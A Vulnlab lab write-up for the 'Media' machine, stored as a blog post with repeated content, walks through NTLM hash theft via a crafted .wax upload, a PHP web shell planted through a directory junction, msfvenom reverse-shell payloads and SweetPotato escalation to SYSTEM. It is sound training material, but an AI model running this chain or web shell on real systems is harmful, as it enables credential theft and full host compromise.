8/7/2024   7:52 PM             70 todo.txt\n```\n\nI did some research into the review script itself to determine if this directory name that is created is based off any properties, and it seems to be static.\n\n```\n    # Read the first line of the file\n    $firstLine = Get-Content $FilePath -TotalCount 1\n\n    # Extract the values from the first line\n    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {\n        $filename = $Matches[1]\n        $randomVariable = $Matches[2]\n\n        # Create a custom object with the extracted values\n        $repoValues = [PSCustomObject]@{\n            FileName = $filename\n            RandomVariable = $randomVariable\n        }\n```\n\nThe \"randomVariable\" variable seems to be static as far as I'm concerned, as there are no hashing algorithms that are used in the above code snippet. With this in mind, I decided to try and upload the same file twice through the web application.\n\n```\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          8/7/2024   7:53 PM              0 todo.txt\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   8:26 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          8/7/2024   8:26 PM             70 todo.txt\n\nPS C:\\Windows\\Tasks\\Uploads> cat todo.txt\nFilename: daz.aspx, Random Variable: ca7a9f126960f1046ff6e022339b54bd\n```\n\nAs you can see, it seems as though the directory that is created is a random variable, however it is static dependent on the name of the file itself. Furthermore, the `todo.txt` file is populated during the file upload process and further cements the name of the directory.\n\n# Exploiting Arbitrary Write Privileges via Symlinks\n\nWith that being said, there is an interesting exploit that we can perform. This involves creating a symlink, which is one of the more common ways that a lot of hackers exploit privilege escalation on Windows and Linux machines.\n\nA symlink is essentially a link between two objects on a filesystem. This can be files, directories, users, however generally when we refer to symlinks on filesystems we are noting the link of directories. This is similar to how mounts work in NFS shares, however this all occurs internally on the machine itself.\n\nCreating a symlink for a directory is relatively easy and involves utilizing the `mklink` command. We'll specify the name of a directory that we want to establish the link on, and then the target directory we want it to be linked to. This will essentially function like a mount - meaning that all files that are created within the first directory will be automatically uploaded to the second directory at the endpoint of the symlink and vice versa. You can find more information about symlinks [here](https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/).\n\nSince we know that the file specifically creates a static name for the directory, we can use this to create a symlink between objects (directories in our case) that are created with the specific name and link it to another directory. We can essentially send this anywhere, however in our case let's try to specifically deliver it to the `C:\\xampp\\htdocs` directory that we previously did not have access to.\n\nLet's first create a simple web shell and upload it via the web application upload functionality. You can find the webshell that I used below from [revshells.com](https://www.revshells.com/).\n\n```PHP\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>\n```\n\nAfter this file is uploaded to the `Uploads` directory, let's grab the name of the directory that is created.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cat .\\todo.txt\nFilename: webshell.php, Random Variable: a5f9e4b2c2e61ae07ffaec35aa299a7d\n```\n\nAfter this, I deleted the folder after it was created, as we have the \"random\" variable that is created. We can then use `mklink` to create a symbolic link between the name of the folder that will be created and the `C:\\xampp\\htdocs` directory.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cmd /c \"mklink /J a5f9e4b2c2e61ae07ffaec35aa299a7d C:\\xampp\\htdocs\"\nJunction created for a5f9e4b2c2e61ae07ffaec35aa299a7d <<===>> C:\\xampp\\htdocs\n```\n\nRemember that `mklink` is a CMD-specific command, meaning it will be unrecognized by PowerShell.\n\nNow that the link has been established, we'll reupload the webshell with the same properties as we did previously. After it is uploaded, we'll check `C:\\xampp\\htdocs` to see if the link worked accordingly.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cd C:\\xampp\\htdocs\nPS C:\\xampp\\htdocs> ls\n\nDirectory: C:\\xampp\\htdocs\n\nMode                 LastWriteTime         Length Name           \n----                 -------------         ------ ----\nd-----         10/2/2023  10:27 AM                assets\nd-----         10/2/2023  10:27 AM                css\nd-----         10/2/2023  10:27 AM                js\n-a----        10/10/2023   5:00 AM          20563 index.php\n-a----          8/7/2024   8:40 PM            348 webshell.php\n```\n\nAs you can see, the webshell was uploaded successfully via the symlink! We were able to essentially write a webshell onto a directory that we previously did not have access to.\n\nIf we browse to the PHP file path, you'll find that we have access to a command execution page.\n\n![](/images/vulnlab/media-vl/e.png)\n\nIt seems that we now have command execution as the `LOCAL SERVICE` account, meaning we can execute a payload to receive a netcat reverse shell as this user. I opted to use the Base64 encoded PowerShell reverse shell from revshells.com.\n\n![](/images/vulnlab/media-vl/f.png)\n\n# Restoring LOCAL SERVICE Privileges\n\n\nNormally since we now have access to the `LOCAL SERVICE` account, we should theoretically have the `SeImpersonatePrivilege` and `SeAssignPrimaryToken` privileges. This would grant us the ability to perform auth coercion to SYSTEM via a malicious named pipe.\n\nHowever if you'll notice from your privileges, it does not seem as though we have that specific privilege handy.\n\n```\nPS C:\\xampp\\htdocs> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                         State   \n============================= =================================== ========\nSeTcbPrivilege                Act as part of the operating system Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled \nSeCreateGlobalPrivilege       Create global objects               Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set      Disabled\nSeTimeZonePrivilege           Change the time zone                Disabled\n```\n\nThere is an easy fix for this, which involves restoring the default privileges set to the `LOCAL SERVICE` account. We can use [this tool](https://github.com/itm4n/FullPowers.git) created by itm4n, which will essentially perform the restoration for us.\n\nLet's first create a MSFVENOM payload for another reverse shell, as we'll need a new session as the restored `LOCAL SERVICE` account. I've been trying to practice exploiting machines without the use of C2's, so we'll just use regular netcat reverse shells for this.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9002 > daz.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n```\n\nWe'll then transfer that to a directory on the remote filesystem using CURL onto your preferred directory (I made a directory within `C:\\temp`).\n\nWe'll then also CURL our compiled `FullPowers.exe` binary onto the host. This should leave us with the below two files.\n\n```\nPS C:\\temp> ls\n\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----\n-a----          8/7/2024   9:11 PM           7168 daz.exe\n-a----          8/7/2024   9:12 PM          36864 FullPowers.exe\n```\n\nWe can then execute `FullPowers` and generate a new session as `LOCAL SERVICE` with our privileges restored with the below command.\n\n```\nPS C:\\temp> .\\FullPowers.exe -c 'C:\\temp\\daz.exe'\n```\n\n![](/images/vulnlab/media-vl/g.png)\n\nAs you can see from the above, we now have `SeImpersonatePrivilege` and can exploit the SYSTEM auth coercion. I've explained this in a few other writeups, however I'll give the rundown just for any new readers.\n\nService accounts, by default, will have he `SeImpersonatePrivilege` token along with  `SeAssignPrimaryTokenPrivilege`. Having `SeImpersonatePrivilege` essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user. Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nWe can use the Potato family of exploits to perform this evil named pipe and auth coercion exploit. Generally if AV is enabled we'd have to use a specific Potato exploit, however that does not seem to be the case here. I'll use [SweetPotato](https://github.com/CCob/SweetPotato) for our case here.\n\nWe'll generate another MSFVENOM reverse shell on port 9003 and start up a netcat listener beforehand.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz2.exe \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n\n└─$ rlwrap nc -lvnp 9003\nlistening on [any] 9003 ...\n```\n\nWe'll then bring our compiled SweetPotato binary over to the remote host via CURL and execute it on our most recent `LOCAL SERVICE` session.\n\n```\nPS C:\\temp> .\\SweetPotato.exe -p 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' -a 'C:\\temp\\daz2.exe' -e EfsRpc\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/64a97836-d71d-4171-86fb-4ee82adf0794/\\64a97836-d71d-4171-86fb-4ee82adf0794\\64a97836-d71d-4171-86fb-4ee82adf0794\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n```\n\nIf we look at our reverse shell window, we can see that a shell was spawned as SYSTEM.\n\n![](/images/vulnlab/media-vl/h.png)\n\nNow that we have a shell as SYSTEM, this means we can effectively read the root flag in the Administrator's Desktop directory, meaning we have completed this machine!\n\n# Conclusion\n\nThis machine in particular was very fun, as the steps to learning symlinks was very helpful and is actually a relatively extensive vulnerability in terms of the actions that you can do. Initially, I had tried to create a symlink onto `C:\\Windows\\System32\\wbem` and hijack a DLL that is loaded when `systeminfo` is called, however it did not see as though that could be done. \n\nRegardless, this machine was great. Big props goes out to enox for creating it.\n# Resources\n\nhttps://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9\nhttps://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\nhttps://github.com/Greenwolf/ntlm_theft\nhttps://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\nhttps://www.revshells.com/\nhttps://github.com/itm4n/FullPowers\nhttps://github.com/CCob/SweetPotato\n\n","source":"_posts/media.md","raw":"---\ntitle: Media - Vulnlab\ndate: 2024-08-08 09:42:08\ntags: [vulnlab, Medium]\ncategories: vulnlab\nkeywords: 'Vulnlab, Medium, Windows'\ndescription: Sendai is an AD machine that focuses on a large quantity of different AD topics. There are a couple ways to exploit different parts of the attack path - to which I'll go over two methods that I was able to perform for both foothold and privilege escalation. I'm guessing that we'll see many similar tactics to the AD boxes that I've completed before.\ncover: /images/vulnlab/media-vl/media_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nMedia is one of the last Medium machines that I'll cover as a part of the medium machines chains. I still have to do the Linux machines along with Unintended (the only Linux-specific chain) but we'll get to those later. This machine covers NTLM theft along with exploiting symlinks and restoring an IIS accounts vulnerable privileges.\n\n# Enumeration\n\nTo start, let's do our usual NMAP scan.\n\n```\n└─$ sudo nmap 10.10.115.42\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 21:54 EDT\nNmap scan report for 10.10.115.42\nHost is up (0.11s latency).\nNot shown: 997 filtered tcp ports (no-response)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3389/tcp open  ms-wbt-server\n\nNmap done: 1 IP address (1 host up) scanned in 19.21 seconds\n```\n\nIt seems that there's a webserver along with remote interface protocols being SSH and RDP. I doubt that we'll have immediate access to these, so our entry point is probably going to be the webserver itself.\n\n![](/images/vulnlab/media-vl/b.png)\n\nThe web application seems to be called \"Promotion Studio\", or at least that could be the CMS being used on the backend. Wappalyzer did give us a bit of info on this website - specifically that it is an Apache webserver running PHP. Aside from that though, we don't have much.\n\nScrolling down however, we do have a noticeable result that may be of use to us.\n\n![](/images/vulnlab/media-vl/c.png)\n\n# NTLM Theft via Windows Media Player\n\nThere looks to be an upload functionality for the hiring team accepting applicants. The process is a bit different than sending a regular document, as it seems that the upload functionality itself is only accepting files that are compatible with Windows Media Player.\n\nDoing some research into the specific file format, it looks like the file extension that we're looking for are either `.asf`, `.wma`, `.wax`, and a few others.\n\n![](/images/vulnlab/media-vl/d.png)\n\nThe interesting part here is that `.wax` is a valid file extension for Windows Media Player, which is also a file extension that is exploitable by NTLM Theft. \n\nTo those who don't know, there are a large variety of files within Windows that are vulnerable to NTLM theft. This specific attack allows us to create a malicious file that will seem like a regular file, however it will instead perform a request to an endpoint that we control.\n\nIn Windows whenever an attempt is made to a URI endpoint, the NetNTLM hash of the client account (the user making the request to the endpoint) is exchanged with the server that is hosting the endpoint. NTLM Theft allows us to poison the request that is made, and extract the NetNTLM hash of the user. This hash is effectively encrypted with the user's plaintext password, giving us the opportunity to crack it.\n\nIn our case, we can create a `.wax` Windows Media Player file and have it point to our attacker machine. If the `.wax` file is executed by a user on the backend of the machine, it poison the request and direct it to our MITM server that we stand up.\n\nTo start, we'll boot up Responder in a separate terminal tab.\n\n```\n└─$ sudo responder -I tun0\n                                         __\n  .----.-----.-----.-----.-----.-----.--|  |.-----.----.\n  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|\n  |__| |_____|_____|   __|_____|__|__|_____||_____|__|\n                   |__|\n\n           NBT-NS, LLMNR & MDNS Responder 3.1.4.0\n......\n[+] Listening for events...\n```\n\nNext, we'll generate a few files using Greenwolf's NTLM theft file generation [here](https://github.com/Greenwolf/ntlm_theft). There is an abundance of different file formats you can use, however we'll be using the `.wax` file type in our case.\n\n```\n└─$ python3 ntlm_theft.py -g wax -s 10.8.0.173 -f daz\nCreated: daz/daz.wax (OPEN)\nGeneration Complete.\n\n└─$ ls -la daz       \ntotal 12\ndrwxrwxr-x 2 daz daz 4096 Aug  7 22:10 .\ndrwxrwxr-x 7 daz daz 4096 Aug  7 22:10 ..\n-rw-rw-r-- 1 daz daz   54 Aug  7 22:10 daz.wax\n```\n\nAll that's left now is to transfer this file via the file upload functionality and wait for any NTLM hash exchanges that are captured in Responder.\n\nAfter about a minute or two of waiting, you should see a successfully captured hash appear.\n\n```\n[+] Listening for events...                                                                                                   \n\n[SMB] NTLMv2-SSP Client   : 10.10.115.42\n[SMB] NTLMv2-SSP Username : MEDIA\\enox\n[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6698cf0238d6cc81:A7112EF24883911141FD714144D4B6FB:010100000000000000F00E5716E9DA014E8B[...snip...]0000000000                                          \n[*] Skipping previously captured hash for MEDIA\\enox\n[*] Skipping previously captured hash for MEDIA\\enox\n```\n\nWe'll crack this using hashcat along with its hash-identifier, which is 5600 for NetNTLM-v2 hashes.\n\n```\n└─$ hashcat -a 0 -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt \nhashcat (v6.2.6) starting\n......\n310030002e0038002e0030002e003100370033000000000000000000:[...snip...]\n\nSession..........: hashcat\nStatus...........: Cracked\nHash.Mode........: 5600 (NetNTLMv2)\n```\n\nAs you can see, we were successfully able to crack the hash for the `enox` user and can now use it to enumerate the target machine.\n\nGiven that we now have credentials and there isn't any form of LDAP or Kerberos on this machine, let's just test a simple authentication attempt through SSH.\n\n```\n└─$ ssh enox@10.10.115.42\nenox@10.10.115.42's password:\nMicrosoft Windows [Version 10.0.20348.1970]\n(c) Microsoft Corporation. All rights reserved.\n\nenox@MEDIA C:\\Users\\enox>\n```\n\nThe first user flag is within the `enox` user's Desktop directory in their home folder.\n\n# Host Reconnaissance\n\nNow that we have shell access as a user on the machine, let's look around a bit. As I said before, there isn't any form of LDAP or Kerberos on this machine, so our privilege escalation should rely and be exploiting completely through the shell that we currently have access to.\n\n```\nPS C:\\> ls\n\nDirectory: C:\\\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          5/8/2021   1:20 AM                PerfLogs\nd-r---        10/10/2023   6:32 AM                Program Files\nd-----          5/8/2021   2:40 AM                Program Files (x86)\nd-r---         10/2/2023  10:26 AM                Users\nd-----        10/10/2023   6:41 AM                Windows\nd-----         10/2/2023  11:03 AM                xampp\n```\n\nThe `C:\\` drive does not seem to have anything obscenely useful in our case, as the `xampp` server is the webserver that we previously exploited.\n\nThe first thing that jumped out to me (since we don't seem to have any exploitable privileges) is the `xampp` webserver directory itself. Generally, files within a `xampp` webserver are hosted within `C:\\xampp\\htdocs`.\n\n```\nPS C:\\xampp\\htdocs> echo 'test' > test.txt\nout-file : Access to the path 'C:\\xampp\\htdocs\\test.txt' is denied.\nAt line:1 char:1\n+ echo 'test' > test.txt\n+ ~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException\n    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand\n```\n\nHowever as you'll notice, it does not seem as though we have write access to this directory. At this point there wouldn't be any form\n\nSomething that also stood out to me after a bit of filesystem enumeration was how the `.wax` files were processed on the backend. In regular cases, this would generally be a user or a group of people from the team. There is however, a script to automate this in `C:\\Users\\enox\\Documents`.\n\n```\nPS C:\\Users\\enox\\Documents> cat review.ps1\n......\n$todofile=\"C:\\\\Windows\\\\Tasks\\\\Uploads\\\\todo.txt\"\n$mediaPlayerPath = \"C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe\"\n\n\nwhile($True){\n\n    if ((Get-Content -Path $todofile) -eq $null) {\n        Write-Host \"Todo is empty.\"\n        Sleep 60 # Sleep for 60 seconds before rechecking\n    }\n```\n\nThe interesting part is the `todofile` that is being commit to a variable name. Browsing to this file in `C:\\Windows\\Tasks\\Uploads` looks to have nothing in it, so we can assume that this text file is only populated when the review script is being ran.\n\nHowever in this directory, you'll notice that there are a few directories alongside the text file. These directories may differ from you, as they seem to be relative to the uploaded file itself.\n\n```\nPS C:\\Windows\\Tasks\\uploads> ls\n\nDirectory: C:\\Windows\\Tasks\\uploads\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----                                                \nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          8/7/2024   7:52 PM             70 todo.txt\n```\n\nI did some research into the review script itself to determine if this directory name that is created is based off any properties, and it seems to be static.\n\n```\n    # Read the first line of the file\n    $firstLine = Get-Content $FilePath -TotalCount 1\n\n    # Extract the values from the first line\n    if ($firstLine -match 'Filename: (.+), Random Variable: (.+)') {\n        $filename = $Matches[1]\n        $randomVariable = $Matches[2]\n\n        # Create a custom object with the extracted values\n        $repoValues = [PSCustomObject]@{\n            FileName = $filename\n            RandomVariable = $randomVariable\n        }\n```\n\nThe \"randomVariable\" variable seems to be static as far as I'm concerned, as there are no hashing algorithms that are used in the above code snippet. With this in mind, I decided to try and upload the same file twice through the web application.\n\n```\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          8/7/2024   7:53 PM              0 todo.txt\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\nd-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4\nd-----          8/7/2024   8:26 PM                ca7a9f126960f1046ff6e022339b54bd\n-a----          8/7/2024   8:26 PM             70 todo.txt\n\nPS C:\\Windows\\Tasks\\Uploads> cat todo.txt\nFilename: daz.aspx, Random Variable: ca7a9f126960f1046ff6e022339b54bd\n```\n\nAs you can see, it seems as though the directory that is created is a random variable, however it is static dependent on the name of the file itself. Furthermore, the `todo.txt` file is populated during the file upload process and further cements the name of the directory.\n\n# Exploiting Arbitrary Write Privileges via Symlinks\n\nWith that being said, there is an interesting exploit that we can perform. This involves creating a symlink, which is one of the more common ways that a lot of hackers exploit privilege escalation on Windows and Linux machines.\n\nA symlink is essentially a link between two objects on a filesystem. This can be files, directories, users, however generally when we refer to symlinks on filesystems we are noting the link of directories. This is similar to how mounts work in NFS shares, however this all occurs internally on the machine itself.\n\nCreating a symlink for a directory is relatively easy and involves utilizing the `mklink` command. We'll specify the name of a directory that we want to establish the link on, and then the target directory we want it to be linked to. This will essentially function like a mount - meaning that all files that are created within the first directory will be automatically uploaded to the second directory at the endpoint of the symlink and vice versa. You can find more information about symlinks [here](https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/).\n\nSince we know that the file specifically creates a static name for the directory, we can use this to create a symlink between objects (directories in our case) that are created with the specific name and link it to another directory. We can essentially send this anywhere, however in our case let's try to specifically deliver it to the `C:\\xampp\\htdocs` directory that we previously did not have access to.\n\nLet's first create a simple web shell and upload it via the web application upload functionality. You can find the webshell that I used below from [revshells.com](https://www.revshells.com/).\n\n```PHP\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset($_GET['cmd']))\n    {\n        system($_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n<script>document.getElementById(\"cmd\").focus();</script>\n</html>\n```\n\nAfter this file is uploaded to the `Uploads` directory, let's grab the name of the directory that is created.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cat .\\todo.txt\nFilename: webshell.php, Random Variable: a5f9e4b2c2e61ae07ffaec35aa299a7d\n```\n\nAfter this, I deleted the folder after it was created, as we have the \"random\" variable that is created. We can then use `mklink` to create a symbolic link between the name of the folder that will be created and the `C:\\xampp\\htdocs` directory.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cmd /c \"mklink /J a5f9e4b2c2e61ae07ffaec35aa299a7d C:\\xampp\\htdocs\"\nJunction created for a5f9e4b2c2e61ae07ffaec35aa299a7d <<===>> C:\\xampp\\htdocs\n```\n\nRemember that `mklink` is a CMD-specific command, meaning it will be unrecognized by PowerShell.\n\nNow that the link has been established, we'll reupload the webshell with the same properties as we did previously. After it is uploaded, we'll check `C:\\xampp\\htdocs` to see if the link worked accordingly.\n\n```\nPS C:\\Windows\\Tasks\\Uploads> cd C:\\xampp\\htdocs\nPS C:\\xampp\\htdocs> ls\n\nDirectory: C:\\xampp\\htdocs\n\nMode                 LastWriteTime         Length Name           \n----                 -------------         ------ ----\nd-----         10/2/2023  10:27 AM                assets\nd-----         10/2/2023  10:27 AM                css\nd-----         10/2/2023  10:27 AM                js\n-a----        10/10/2023   5:00 AM          20563 index.php\n-a----          8/7/2024   8:40 PM            348 webshell.php\n```\n\nAs you can see, the webshell was uploaded successfully via the symlink! We were able to essentially write a webshell onto a directory that we previously did not have access to.\n\nIf we browse to the PHP file path, you'll find that we have access to a command execution page.\n\n![](/images/vulnlab/media-vl/e.png)\n\nIt seems that we now have command execution as the `LOCAL SERVICE` account, meaning we can execute a payload to receive a netcat reverse shell as this user. I opted to use the Base64 encoded PowerShell reverse shell from revshells.com.\n\n![](/images/vulnlab/media-vl/f.png)\n\n# Restoring LOCAL SERVICE Privileges\n\n\nNormally since we now have access to the `LOCAL SERVICE` account, we should theoretically have the `SeImpersonatePrivilege` and `SeAssignPrimaryToken` privileges. This would grant us the ability to perform auth coercion to SYSTEM via a malicious named pipe.\n\nHowever if you'll notice from your privileges, it does not seem as though we have that specific privilege handy.\n\n```\nPS C:\\xampp\\htdocs> whoami /priv\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                         State   \n============================= =================================== ========\nSeTcbPrivilege                Act as part of the operating system Disabled\nSeChangeNotifyPrivilege       Bypass traverse checking            Enabled \nSeCreateGlobalPrivilege       Create global objects               Enabled \nSeIncreaseWorkingSetPrivilege Increase a process working set      Disabled\nSeTimeZonePrivilege           Change the time zone                Disabled\n```\n\nThere is an easy fix for this, which involves restoring the default privileges set to the `LOCAL SERVICE` account. We can use [this tool](https://github.com/itm4n/FullPowers.git) created by itm4n, which will essentially perform the restoration for us.\n\nLet's first create a MSFVENOM payload for another reverse shell, as we'll need a new session as the restored `LOCAL SERVICE` account. I've been trying to practice exploiting machines without the use of C2's, so we'll just use regular netcat reverse shells for this.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9002 > daz.exe\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n```\n\nWe'll then transfer that to a directory on the remote filesystem using CURL onto your preferred directory (I made a directory within `C:\\temp`).\n\nWe'll then also CURL our compiled `FullPowers.exe` binary onto the host. This should leave us with the below two files.\n\n```\nPS C:\\temp> ls\n\nDirectory: C:\\temp\n\nMode                 LastWriteTime         Length Name                   \n----                 -------------         ------ ----\n-a----          8/7/2024   9:11 PM           7168 daz.exe\n-a----          8/7/2024   9:12 PM          36864 FullPowers.exe\n```\n\nWe can then execute `FullPowers` and generate a new session as `LOCAL SERVICE` with our privileges restored with the below command.\n\n```\nPS C:\\temp> .\\FullPowers.exe -c 'C:\\temp\\daz.exe'\n```\n\n![](/images/vulnlab/media-vl/g.png)\n\nAs you can see from the above, we now have `SeImpersonatePrivilege` and can exploit the SYSTEM auth coercion. I've explained this in a few other writeups, however I'll give the rundown just for any new readers.\n\nService accounts, by default, will have he `SeImpersonatePrivilege` token along with  `SeAssignPrimaryTokenPrivilege`. Having `SeImpersonatePrivilege` essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user. Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.\n\nWe can use the Potato family of exploits to perform this evil named pipe and auth coercion exploit. Generally if AV is enabled we'd have to use a specific Potato exploit, however that does not seem to be the case here. I'll use [SweetPotato](https://github.com/CCob/SweetPotato) for our case here.\n\nWe'll generate another MSFVENOM reverse shell on port 9003 and start up a netcat listener beforehand.\n\n```\n└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 > daz2.exe \n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\nNo encoder specified, outputting raw payload\nPayload size: 460 bytes\nFinal size of exe file: 7168 bytes\n\n└─$ rlwrap nc -lvnp 9003\nlistening on [any] 9003 ...\n```\n\nWe'll then bring our compiled SweetPotato binary over to the remote host via CURL and execute it on our most recent `LOCAL SERVICE` session.\n\n```\nPS C:\\temp> .\\SweetPotato.exe -p 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' -a 'C:\\temp\\daz2.exe' -e EfsRpc\nSweetPotato by @_EthicalChaos_\n  Orignal RottenPotato code and exploit by @foxglovesec\n  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n  PrintSpoofer discovery and original exploit by @itm4n\n  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam\n[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/64a97836-d71d-4171-86fb-4ee82adf0794/\\64a97836-d71d-4171-86fb-4ee82adf0794\\64a97836-d71d-4171-86fb-4ee82adf0794\n[+] Server connected to our evil RPC pipe\n[+] Duplicated impersonation token ready for process creation\n[+] Intercepted and authenticated successfully, launching program\n[+] Process created, enjoy!\n```\n\nIf we look at our reverse shell window, we can see that a shell was spawned as SYSTEM.\n\n![](/images/vulnlab/media-vl/h.png)\n\nNow that we have a shell as SYSTEM, this means we can effectively read the root flag in the Administrator's Desktop directory, meaning we have completed this machine!\n\n# Conclusion\n\nThis machine in particular was very fun, as the steps to learning symlinks was very helpful and is actually a relatively extensive vulnerability in terms of the actions that you can do. Initially, I had tried to create a symlink onto `C:\\Windows\\System32\\wbem` and hijack a DLL that is loaded when `systeminfo` is called, however it did not see as though that could be done. \n\nRegardless, this machine was great. Big props goes out to enox for creating it.\n# Resources\n\nhttps://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9\nhttps://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\nhttps://github.com/Greenwolf/ntlm_theft\nhttps://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\nhttps://www.revshells.com/\nhttps://github.com/itm4n/FullPowers\nhttps://github.com/CCob/SweetPotato\n\n","slug":"media","published":1,"updated":"2024-08-08T13:52:40.646Z","comments":1,"layout":"post","photos":[],"_id":"clzlc8gnl0000d5uf5c1jgu6w","content":"<p>Media is one of the last Medium machines that I’ll cover as a part of the medium machines chains. I still have to do the Linux machines along with Unintended (the only Linux-specific chain) but we’ll get to those later. This machine covers NTLM theft along with exploiting symlinks and restoring an IIS accounts vulnerable privileges.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>To start, let’s do our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.115.42</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 21:54 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.115.42</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 997 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span 